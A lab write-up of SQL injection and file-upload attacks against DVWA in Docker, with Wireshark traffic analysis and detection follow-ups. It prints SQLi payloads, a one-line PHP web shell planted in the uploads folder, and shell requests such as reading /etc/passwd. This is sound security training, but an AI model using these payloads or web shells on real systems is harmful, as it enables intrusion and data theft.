# Attack Traffic Analysis: SQL Injection & File Upload RCE Against DVWA

## Overview

This write-up documents a hands-on offensive testing session against DVWA (Damn Vulnerable Web Application), deployed as a Docker container alongside OWASP Juice Shop on the lab's Docker host. The goal was to practice manual exploitation, capture the resulting network traffic, and analyze it in Wireshark to build packet-analysis skills — specifically targeting weaker areas identified during interview preparation (subtle traffic pattern recognition, root-cause investigation of anomalies).

Traffic was captured host-side using `tcpdump`, transferred to a Windows analysis workstation via SCP, and examined in Wireshark.

## Environment

- **Target:** DVWA (Docker container, `vulnerables/web-dvwa`), security level: Low
- **Secondary target (same host):** OWASP Juice Shop
- **Capture method:** `sudo tcpdump -i any -w attack_session.pcap` on the Docker host
- **Analysis tool:** Wireshark (Windows host)

## Finding 1: SQL Injection — Authentication Bypass Pattern (Login Form)

**Attempted payload:** `' OR 1=1--` submitted via the login form.

**Result:** No corresponding payload was visible in the nginx access log or PCAP — only the resulting HTTP `500` response was captured (rule 31122 in Wazuh). This is because the payload was submitted via **POST body**, and default nginx/web server access logs only record the request URL, not the body content.

**Conclusion:** Documented as a known visibility limitation rather than a failed test — the attack likely executed against the backend, but standard logging could not confirm the specific payload without extending log configuration to capture request bodies (a documented trade-off; see companion write-up *Simulated Network & Application-Layer Attack Detection with Wazuh*).

## Finding 2: SQL Injection — Data Exfiltration via GET Parameter (DVWA SQLi Module)

Unlike the login form, DVWA's dedicated SQL Injection module submits its payload via a **GET parameter**, making the full attack fully visible in both server logs and packet capture.

**Payload submitted:** `1' OR '1'='1`

**Request observed (Wireshark, HTTP filter):**
```
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
```
(URL-decoded: `id=1' OR '1'='1`)

**Response observed:** The query, intended to return a single user record by ID, instead returned all five records in the users table:
```
ID: 1' OR '1'='1
First name: admin      | Surname: admin
First name: Gordon     | Surname: Brown
First name: Hack       | Surname: Me
First name: Pablo      | Surname: Picasso
First name: Bob        | Surname: Smith
```

**Root cause:** The backend query was constructed by directly concatenating user input into a SQL string, approximately:
```sql
SELECT first_name, surname FROM users WHERE user_id = '$id';
```
Injecting `1' OR '1'='1` altered the query logic to:
```sql
SELECT first_name, surname FROM users WHERE user_id = '1' OR '1'='1';
```
Since `'1'='1'` evaluates true for every row, the `WHERE` clause matched the entire table rather than a single record — a full, unauthorized data dump from a single crafted parameter.

**Additional observation:** The response HTML explicitly stated `PHPIDS: disabled` — DVWA's optional intrusion detection layer was inactive at this security level, meaning no detection mechanism was present to flag the anomalous query pattern. This directly motivated the earlier decision to build Wazuh detection coverage for this environment (see custom rule 100020, which flags repeated failures on authentication endpoints — a complementary detection to this specific finding).

*[Screenshot: DVWA SQLi response showing full table dump]*

## Finding 3: File Upload to Remote Code Execution

**Objective:** Upload a malicious file to DVWA's File Upload module and achieve command execution.

**Attempt 1 — via browser upload form:** Uploaded a single-line PHP payload:
```php
<?php system($_GET['cmd']); ?>
```
**Result:** Partially mitigated. The uploaded file was saved with an appended `.txt` extension (`shell.php.txt`), preventing PHP execution regardless of the requested URL. This is a meaningful finding in its own right — even an intentionally vulnerable application's Docker packaging included this extension-handling behavior, demonstrating that a single vulnerable code path doesn't guarantee full exploitability in every deployment/configuration.

**Attempt 2 — direct file placement:** To isolate and confirm the underlying vulnerability independent of the browser upload path's extension handling, the payload was placed directly into the container's upload directory:
```bash
docker exec dvwa sh -c 'echo "<?php system(\$_GET[\"cmd\"]); ?>" > /var/www/html/hackable/uploads/shell.php'
```

**Result: Successful remote code execution**, confirmed via multiple commands submitted as GET parameters:
```
GET /hackable/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

GET /hackable/uploads/shell.php?cmd=whoami
→ www-data

GET /hackable/uploads/shell.php?cmd=uname+-a
GET /hackable/uploads/shell.php?cmd=cat+/etc/passwd
```

*[Screenshot: sequence of shell.php?cmd= requests and command output]*

**Why this matters:** A single unauthenticated file upload vulnerability, chained with the ability to execute the uploaded file, grants an attacker code execution equivalent to the web server process's own privileges (`www-data`). From this foothold, an attacker could pursue privilege escalation, lateral movement to other hosts reachable from the web server, or further payload delivery. This is why real-world upload validation must verify file *content* (not just extension), disable script execution in upload directories, and store uploads outside the web root.

**Detection note:** Unlike the login-form SQLi (Finding 1), this attack's payload is fully visible in standard access logs, since the command is passed via GET parameter rather than POST body — every `?cmd=` value would appear in plaintext in an nginx access log, making this a strong candidate for a future custom Wazuh detection rule (e.g., matching `cmd=` parameter patterns or common command-injection strings in access logs).

## Finding 4: TCP Duplicate ACK Investigation (Root Cause Analysis)

During analysis of the SQLi capture, a cluster of TCP Duplicate ACKs was identified (`tcp.analysis.duplicate_ack` filter) around the DVWA SQLi request traffic.

**Investigation process:**
1. Confirmed the Dup ACKs were on the same stream as legitimate DVWA SQLi test traffic (not unrelated background noise)
2. Checked HTTP request/response timing — found normal, unremarkable latency, ruling out a struggling backend as the cause
3. Filtered on `http.request.uri contains "sqli"` and found **paired GET requests with paired 200 OK responses** in quick succession

**Conclusion:** The Dup ACKs were caused by near-duplicate client-side requests (likely a double form submission or browser resource-loading behavior) creating overlapping traffic on the same connection, which the receiver interpreted as out-of-order delivery — not by network loss, congestion, or anything related to the virtualization/NAT stack.

**Why this matters:** This distinguishes a transport-layer symptom (Dup ACK, which looks like a network problem) from its actual application-layer root cause (duplicate client requests). Correctly tracing an anomaly to its true origin — rather than stopping at the first plausible explanation — is a core packet-analysis skill, and this was a genuine example of doing that investigation properly rather than assuming network noise or flagging it as a false security concern.

## Skills Demonstrated

- Manual web application exploitation (SQL injection, file upload to RCE)
- Understanding of SQL injection root cause at the query-construction level, not just payload syntax
- Recognition of logging visibility differences between GET and POST-based attacks, and their implications for detection engineering
- Packet capture and analysis workflow (tcpdump on target host → SCP transfer → Wireshark analysis)
- Wireshark filtering (`http.request.uri contains`, `tcp.analysis.duplicate_ack`), HTTP stream following, and conversation analysis
- Root-cause investigation methodology: distinguishing genuine anomalies from environmental/testing artifacts
- Honest documentation of partial mitigations encountered (file extension handling) rather than only reporting clean successes
- Practical understanding of defense-in-depth failure: an app with no active IDS (`PHPIDS: disabled`) has no chance of catching an attack regardless of how "obvious" the payload is — reinforcing why external detection layers (Wazuh) matter

## Next Steps / Identified Follow-Up Work

- Author a custom Wazuh rule to detect command-injection-style patterns in access logs (e.g., `cmd=`, shell metacharacters in GET parameters)
- Extend nginx logging to capture POST bodies, closing the visibility gap identified in Finding 1
- Repeat this exercise against DVWA's Command Injection and XSS modules for additional traffic pattern variety
- Correlate this network-layer evidence with Wazuh's host-level alerts from the same time window, to build a combined network + host investigation narrative
